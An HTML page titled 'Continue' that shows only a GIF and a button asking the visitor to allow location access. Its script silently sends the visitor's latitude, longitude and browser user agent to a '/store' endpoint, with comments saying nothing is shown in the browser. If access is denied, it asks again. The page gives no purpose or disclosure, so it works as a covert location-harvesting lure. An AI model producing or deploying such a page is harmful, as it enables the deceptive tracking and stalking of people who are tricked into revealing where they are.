<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Continue</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0a0a0a;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .gif-wrapper {
            width: 320px;
            height: 320px;
            margin: 0 auto 30px;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 0 40px rgba(99, 102, 241, 0.3);
            border: 2px solid rgba(99, 102, 241, 0.2);
        }

        .gif-wrapper img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .message {
            color: #e2e8f0;
            font-size: 1.1rem;
            font-weight: 300;
            letter-spacing: 1px;
            margin-bottom: 24px;
        }

        .allow-btn {
            padding: 14px 40px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 1.05rem;
            font-weight: 600;
            cursor: pointer;
            letter-spacing: 1px;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 20px rgba(99, 102, 241, 0.3);
        }

        .allow-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(99, 102, 241, 0.5);
        }

        .allow-btn:active {
            transform: translateY(0);
        }

        /* Hide button after success */
        .allow-btn.hidden {
            display: none;
        }

        .success-text {
            display: none;
            color: #22c55e;
            font-size: 1.1rem;
            margin-top: 20px;
            animation: fadeIn 0.5s ease;
        }

        .success-text.show {
            display: block;
        }

        .loading-spinner {
            display: none;
            margin: 20px auto 0;
            width: 36px;
            height: 36px;
            border: 3px solid rgba(99, 102, 241, 0.2);
            border-top: 3px solid #818cf8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .loading-spinner.show {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to   { opacity: 1; transform: translateY(0); }
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="gif-wrapper">
            <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Loading">
        </div>

        <p class="message" id="message">To continue, please allow location access</p>

        <button class="allow-btn" id="allowBtn" onclick="requestLocation()">
            📍 Allow Location
        </button>

        <div class="loading-spinner" id="spinner"></div>
        <p class="success-text" id="successText">✅ Thank you! You may continue.</p>
    </div>

    <script>
        function requestLocation() {
            // Show spinner while waiting
            document.getElementById("spinner").classList.add("show");
            document.getElementById("allowBtn").classList.add("hidden");
            document.getElementById("message").textContent = "Requesting access...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(onSuccess, onDenied);
            }
        }

        function onSuccess(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const uagent = navigator.userAgent;

            // Silently send to server — nothing shown in browser
            const url = "/store?lat=" + lat +
                        "&long=" + lon +
                        "&uagent=" + encodeURIComponent(uagent);

            fetch(url).catch(() => {});

            // Show a generic success message (no location data displayed)
            document.getElementById("spinner").classList.remove("show");
            document.getElementById("message").textContent = "";
            document.getElementById("successText").classList.add("show");
        }

        function onDenied() {
            // If denied, keep asking — show the button again
            document.getElementById("spinner").classList.remove("show");
            document.getElementById("allowBtn").classList.remove("hidden");
            document.getElementById("message").textContent = "Location access is required to continue";
        }
    </script>

</body>
</html>
